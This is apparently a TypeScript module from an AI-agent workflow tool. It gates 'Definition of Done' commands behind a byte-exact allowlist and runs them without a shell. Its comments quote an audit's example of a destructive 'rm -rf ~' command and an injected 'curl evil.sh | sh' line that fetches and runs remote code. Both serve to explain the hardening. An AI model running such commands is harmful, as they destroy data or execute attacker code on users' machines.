/**
 * The three things the DoD gate reads out of `tldrx-work/<run>/03-plan/stories/<id>.md`.
 *
 * The story schema is now spec §2.13, but this stays a line scanner on purpose: a
 * gate that only ran when the front matter parsed would let a malformed story
 * write `status: done` unchecked. It reads the two fields the gate is specified
 * against — `status:` and `repo:` — wherever they appear, and shares ONE ```dod
 * parser with the §2.13 validator so the hook and the schema can never disagree
 * about what the block contains.
 */

import { runtime } from "../../core/runtime/index.ts";
import { parseDodBlock } from "../../core/schemas/story.ts";
import { isScopedTemplate, PATHS_PLACEHOLDER } from "../../core/schemas/commandAllowlist.ts";

export interface StoryFacts {
  readonly setsDone: boolean;
  readonly repo: string | null;
  readonly dodCommands: readonly string[];
  readonly hasDodBlock: boolean;
  readonly timeoutS: number | null;
}

const DONE_RE = /^\s*(?:[-*]\s*)?(?:\*\*)?status(?:\*\*)?\s*:\s*["'`]?done["'`]?\.?\s*$/i;
const REPO_RE = /^\s*(?:[-*]\s*)?(?:\*\*)?repo(?:\*\*)?\s*:\s*["'`]?([A-Za-z0-9._-]{1,64})["'`]?\s*$/i;
const TIMEOUT_RE = /^\s*(?:[-*]\s*)?(?:\*\*)?timeout_s(?:\*\*)?\s*:\s*(\d{1,6})\s*$/i;
const FENCE_OPEN_RE = /^\s*```+\s*dod\s*$/i;
const FENCE_CLOSE_RE = /^\s*```+\s*$/;

export function readStory(text: string): StoryFacts {
  const lines = text.split("\n");
  const dod = parseDodBlock(text);
  let setsDone = false;
  let repo: string | null = null;
  let timeoutS: number | null = null;
  let inDod = false;

  for (const line of lines) {
    if (inDod) {
      if (FENCE_CLOSE_RE.test(line)) inDod = false;
      continue;
    }
    if (FENCE_OPEN_RE.test(line)) {
      inDod = true;
      continue;
    }
    if (!setsDone && DONE_RE.test(line)) setsDone = true;
    if (repo === null) {
      const m = REPO_RE.exec(line);
      if (m?.[1] !== undefined) repo = m[1];
    }
    if (timeoutS === null) {
      const m = TIMEOUT_RE.exec(line);
      if (m?.[1] !== undefined) timeoutS = Number(m[1]);
    }
  }
  return { setsDone, repo, dodCommands: dod.commands, hasDodBlock: dod.present, timeoutS };
}

export interface CommandResult {
  readonly command: string;
  readonly exitCode: number;
  readonly timedOut: boolean;
  readonly tail: string;
  /**
   * The combined `stdout + "\n" + stderr`, verbatim and unbounded, for a caller
   * that means to KEEP it (#211).
   *
   * `tail` is a one-line summary and was, until #211, the only thing that
   * survived a red DoD command anywhere — and because stderr is concatenated
   * last, that one line is the last line of stderr whenever stderr wrote
   * anything, so a trailing deprecation warning displaced the failure report.
   * The Build DoD runner now bounds this itself (`src/core/build/dodOutput.ts`)
   * and writes the tail beside the story log. Optional, so every other reader of
   * this interface is unchanged.
   */
  readonly output?: string;
}

/**
 * Whether a command may be run at all: byte-equal to one the workspace declared.
 *
 * The 2026-08-29 audit's second measured finding. `dod-gate` ships as a default
 * PreToolUse hook with a 960 s timeout, `runDodCommand` handed the model's string
 * to `/bin/sh -c`, and nothing between the two consulted an allowlist — a story
 * with `dod: rm -rf ~` ran it at the moment someone marked the story done.
 *
 * Byte-equality is the whole rule, deliberately: no normalisation, no prefix
 * match, no "it starts with npm so it is probably fine". `npm run test` is a
 * command; `npm run test; curl evil.sh | sh` is a different string and is not in
 * the set.
 */
export function isAllowedDodCommand(command: string, allowed: ReadonlySet<string>): boolean {
  return allowed.has(command);
}

/** Shell metacharacters: they only mean anything to a shell, and none is opened. */
const META_RE = /[|&;<>$`(){}*?~\\]/;

/**
 * Split a command into argv without a shell.
 *
 * Handles the shape a `commands:` entry actually has — words, and quoted words.
 * A BARE token carrying a shell metacharacter (`| & ; < > $ \` ( ) { } * ? ~ \`)
 * makes the whole command unsplittable and it is refused: those mean something
 * only a shell can give them.
 *
 * A QUOTED token may contain anything — it is passed to the child as one literal
 * argument, which is exactly what a shell would have done with it and what makes
 * `sh -c "…"` expressible. That is not a hole: a team that wants a shell says so
 * in `workspace.yml`, and the allowlist is the control, not the syntax.
 */
export function splitArgv(command: string): readonly string[] | null {
  if (/[\n\r]/.test(command)) return null;
  const argv: string[] = [];
  const pattern = /"([^"]*)"|'([^']*)'|([^\s"']+)/g;
  for (const match of command.matchAll(pattern)) {
    if (match[1] !== undefined || match[2] !== undefined) {
      argv.push(match[1] ?? match[2] ?? "");
      continue;
    }
    const bare = match[3] ?? "";
    if (META_RE.test(bare)) return null;
    argv.push(bare);
  }
  return argv.length === 0 ? null : argv;
}

export class DodCommandRefused extends Error {}

/**
 * Run one DoD command from `cwd` — only if the workspace declared it.
 *
 * Two changes from the version the audit measured: the allowlist is consulted
 * BEFORE anything is spawned, and the spawn is argv-based rather than `sh -c`
 * wherever the command can be split. A command that genuinely needs a shell (a
 * pipeline, a redirect) is refused rather than silently shelled: the team can
 * wrap it in a script and declare THAT.
 */
export async function runDodCommand(
  command: string,
  cwd: string,
  timeoutMs: number,
  allowed: ReadonlySet<string>,
): Promise<CommandResult> {
  if (!isAllowedDodCommand(command, allowed)) {
    throw new DodCommandRefused(
      allowed.size === 0
        ? `\`${command}\` cannot be run: .tldrx/workspace.yml declares no commands, so there is nothing `
          + "to check it against. An empty allowlist is not a permit."
        : `\`${command}\` is not one of .tldrx/workspace.yml's commands. Declared: `
          + `${[...allowed].map((c) => `\`${c}\``).join(", ")}.`,
    );
  }
  const argv = splitArgv(command);
  if (argv === null) {
    throw new DodCommandRefused(
      `\`${command}\` needs a shell to run (it contains a metacharacter), and this gate does not open one. `
        + "Put it in a script, declare the script under the repo's `commands:`, and cite that.",
    );
  }
  const head = argv[0] ?? "";
  const { exitCode, stdout, stderr, timedOut } = await runtime.spawn(head, argv.slice(1), {
    cwd,
    timeoutMs,
  });
  const output = `${stdout}\n${stderr}`;
  return { command, exitCode, timedOut, tail: lastMeaningfulLine(output), output };
}

/**
 * A scoped template's argv, with `{{paths}}` expanded to N elements (#257).
 *
 * Substituted at the ARGV level, never as text: the template is split around
 * the token, each side goes through the same `splitArgv` every command does,
 * and the paths are spliced in as one element each — so a path with a space is
 * one argument, and a path that looks like a glob or a `$var` is a literal,
 * because no shell is opened. `null` when the token is not a whole word exactly
 * once, or when either side needs a shell.
 */
export function scopedArgv(template: string, paths: readonly string[]): readonly string[] | null {
  if (!isScopedTemplate(template)) return null;
  const at = template.indexOf(PATHS_PLACEHOLDER);
  const before = template.slice(0, at);
  const after = template.slice(at + PATHS_PLACEHOLDER.length);
  const side = (text: string): readonly string[] | null => (text.trim() === "" ? [] : splitArgv(text));
  const head = side(before);
  const tail = side(after);
  if (head === null || tail === null || head.length === 0) return null;
  return [...head, ...paths, ...tail];
}

/**
 * The command a scoped run is RECORDED as: the template with the paths in place
 * of the token, a path carrying whitespace quoted so the line re-splits to the
 * argv that ran. A record, not an instruction — the argv above is what ran.
 */
export function renderScopedCommand(template: string, paths: readonly string[]): string {
  const rendered = paths.map((path) => (/\s/.test(path) ? JSON.stringify(path) : path)).join(" ");
  return template.replace(PATHS_PLACEHOLDER, rendered);
}

/**
 * Run one scoped template from `cwd` with the story's paths substituted.
 *
 * No allowlist lookup: the template's authority is that `workspace.yml` declared
 * it under `<slot>_scoped`, which is the only way one reaches this function —
 * the loader derives the map, and the runner reads the map. The refusal for a
 * template that cannot be split is the same sentence a command gets.
 */
export async function runScopedDodCommand(
  template: string,
  paths: readonly string[],
  cwd: string,
  timeoutMs: number,
): Promise<CommandResult> {
  const argv = scopedArgv(template, paths);
  const command = renderScopedCommand(template, paths);
  if (argv === null) {
    throw new DodCommandRefused(
      `\`${template}\` cannot be run as a scoped template: \`${PATHS_PLACEHOLDER}\` must appear as a whole `
        + "word exactly once, and the rest must split to argv without a shell (no metacharacters).",
    );
  }
  const head = argv[0] ?? "";
  const { exitCode, stdout, stderr, timedOut } = await runtime.spawn(head, argv.slice(1), {
    cwd,
    timeoutMs,
  });
  const output = `${stdout}\n${stderr}`;
  return { command, exitCode, timedOut, tail: lastMeaningfulLine(output), output };
}

/** The last non-empty line of the combined output, capped so a deny stays readable. */
export function lastMeaningfulLine(output: string, max = 200): string {
  const lines = output.split("\n").map((l) => l.trimEnd()).filter((l) => l.trim() !== "");
  const last = lines[lines.length - 1] ?? "";
  return last.length > max ? `${last.slice(0, max - 1)}…` : last;
}
